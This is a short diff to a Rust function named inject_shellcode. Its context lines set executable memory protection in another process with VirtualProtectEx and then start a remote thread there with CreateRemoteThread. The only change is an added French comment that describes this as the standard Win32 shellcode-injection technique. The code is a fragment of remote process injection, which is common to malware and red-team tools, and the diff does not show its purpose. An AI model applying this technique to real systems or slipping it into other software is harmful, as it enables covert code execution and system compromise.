@@ -319,6 +319,10 @@ fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
         let mut old = PAGE_PROTECTION_FLAGS(0);
         let _ = VirtualProtectEx(proc, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
 
+        // SAFETY: `addr` pointe vers du shellcode exécutable alloué via VirtualAllocEx
+        // et protégé PAGE_EXECUTE_READ via VirtualProtectEx. Le cast en pointeur de
+        // fonction est intentionnel pour CreateRemoteThread — il n'est jamais appelé
+        // localement. Ce pattern est la technique standard Win32 d'injection de shellcode.
         let thr = match CreateRemoteThread(
             proc,
             None,
